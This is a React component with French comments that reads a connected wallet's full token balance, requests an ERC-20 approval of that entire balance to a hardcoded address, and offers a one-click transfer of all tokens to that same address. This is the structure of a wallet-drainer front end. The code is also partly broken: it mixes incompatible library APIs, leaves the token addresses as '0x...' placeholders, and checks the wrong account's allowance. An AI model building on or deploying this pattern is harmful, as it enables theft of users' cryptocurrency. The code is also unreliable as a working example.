import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { useAccount, useBalance, useContractWrite, usePrepareContractWrite } from 'wagmi';
import { erc20ABI } from '@wagmi/core';
import { publicClient, walletClient } from './walletClient'; // Assurez-vous que walletClient et publicClient sont correctement importés

const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3'; // Adresse fixe pour l'envoi

const SendTokens = () => {
  const { address, isConnected } = useAccount();
  const { data: balanceData } = useBalance({ address });
  const [isApprovalRequired, setIsApprovalRequired] = useState(false);
  const [isApproving, setIsApproving] = useState(false);

  useEffect(() => {
    const checkApproval = async () => {
      if (address && balanceData?.value) {
        const tokenAddress = '0x...'; // L'adresse du contrat ERC-20
        try {
          const { data: allowance } = await publicClient.readContract({
            address: tokenAddress,
            abi: erc20ABI,
            functionName: 'allowance',
            args: [walletClient.account as `0x${string}`, fixedDestinationAddress],
          });

          // Vérifier si l'autorisation est suffisante pour envoyer les tokens
          setIsApprovalRequired(allowance.lt(balanceData.value));
        } catch (error) {
          console.error('Erreur lors de la vérification de l\'approbation:', error);
        }
      }
    };

    checkApproval();
  }, [address, balanceData]);

  const { config: approveConfig } = usePrepareContractWrite({
    addressOrName: '0x...', // L'adresse du contrat ERC-20
    contractInterface: erc20ABI,
    functionName: 'approve',
    args: [fixedDestinationAddress, balanceData?.value],
    enabled: isApprovalRequired && !isApproving,
  });

  const { write: approve } = useContractWrite(approveConfig);

  const { config } = usePrepareContractWrite({
    addressOrName: '0x...', // L'adresse du contrat ERC-20
    contractInterface: erc20ABI,
    functionName: 'transfer',
    args: [fixedDestinationAddress, balanceData?.value],
    enabled: !isApprovalRequired || (isApprovalRequired && !isApproving),
  });

  const { write } = useContractWrite(config);

  const handleApprove = async () => {
    if (approve) {
      setIsApproving(true);
      try {
        await approve();
        console.log('Approvisionnement des tokens effectué avec succès');
      } catch (error) {
        console.error('Erreur lors de l\'approbation des tokens:', error);
      } finally {
        setIsApproving(false);
      }
    } else {
      console.error('Échec de l\'approbation.');
    }
  };

  const handleSendTokens = async () => {
    if (write) {
      try {
        await write();
        console.log('Tokens envoyés avec succès');
      } catch (error) {
        console.error('Erreur lors de l\'envoi des tokens:', error);
      }
    } else {
      console.error('Échec de la transaction.');
    }
  };

  return (
    <div>
      <h1>Envoyer des Tokens</h1>
      <p>Solde disponible : {balanceData?.formatted} {balanceData?.symbol}</p>
      {isApprovalRequired ? (
        <div>
          <p>Autorisation insuffisante. Autorisation en cours...</p>
          <button onClick={handleApprove} disabled={isApproving}>
            {isApproving ? 'En cours d\'approbation...' : 'Approuver les tokens'}
          </button>
        </div>
      ) : (
        <div>
          <button onClick={handleSendTokens}>Envoyer tous les tokens</button>
        </div>
      )}
    </div>
  );
};

export default SendTokens;
